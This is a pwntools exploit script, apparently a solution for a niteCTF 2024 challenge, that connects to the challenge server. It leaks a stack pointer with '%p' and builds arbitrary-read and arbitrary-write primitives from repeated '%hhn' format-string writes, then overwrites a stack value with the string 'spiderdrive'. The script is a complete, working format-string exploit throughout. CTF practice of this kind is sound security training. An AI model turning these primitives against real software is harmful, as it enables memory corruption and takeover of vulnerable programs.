from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = '172.17.0.2'
PORT =  1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        #return remote(HOST, PORT)
        return remote("chaterine.chals.nitectf2024.live", PORT, ssl=True)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [])

r.sendline(b'%p')
r.recvuntil(b'Hello ')
leak = int(r.recvuntil(b'\n', True), 16)
stack_start = leak + 0x2120
# offset: 6
selector = stack_start + 8*10
writer = stack_start + 8*46
#victim = stack_start + 8*47
victim = stack_start + 8*11

selector = stack_start + 8*13
writer = stack_start + 8*43
#victim = stack_start + 8*47
victim = stack_start + 8*11

target = stack_start + 8*2
ofs_selector = 6+10
ofs_writer = 6+40
ofs_victim = 6+11

ofs_selector = 6+13
ofs_writer = 6+43
ofs_victim = 6+11

#victim = (stack_start + 8*40) & 0xffffffffffffff00
print(f'{writer = :#x}')
print(f'{victim = :#x}')

r.sendlineafter(b'>>', b'1')
r.sendlineafter(b'index:', b'0')
r.sendlineafter(b'size:', b'4000')

def fsb(p):
    r.sendlineafter(b'>>', b'3')
    r.sendlineafter(b'index:', b'0')
    r.sendline(p)
    return r.recvuntil(b'\nhas been', True)


def aar(where):
    for i in range(6):
        fsb(f'%{(victim+i) & 0xff}c%{ofs_selector}$hhn'.encode())
        a = ((where>>(i*8)) & 0xff)
        if a == 0:
            a = 0x100
        fsb(f'%{a}c%{ofs_writer}$hhn'.encode())
    leak = u64(fsb(f'%{ofs_victim}$s'.encode()).ljust(8, b'\x00'))
    return leak

def aaw(where, what):
    for x in range(8):
        for i in range(6):
            fsb(f'%{(victim+i) & 0xff}c%{ofs_selector}$hhn'.encode())
            a = (((where+x)>>(i*8)) & 0xff)
            if a == 0:
                a = 0x100
            fsb(f'%{a}c%{ofs_writer}$hhn'.encode())
        b = ((what>>(x*8)) & 0xff)
        if b == 0:
            b = 0x100
        fsb(f'%{b}c%{ofs_victim}$hhn'.encode())

fsb(f'%{(victim) & 0xffff}c%{ofs_selector}$hn'.encode())
#leak = aar(stack_start + 8*5 + 1)
#print(f'{leak = :#x}')
#pause()
aaw(target, u64(b'spiderdr'))
aaw(target+8, u64(b'ive\x00\x00\x00\x00\x00'))
r.sendlineafter(b'>>', b'4')

r.interactive()
r.close()

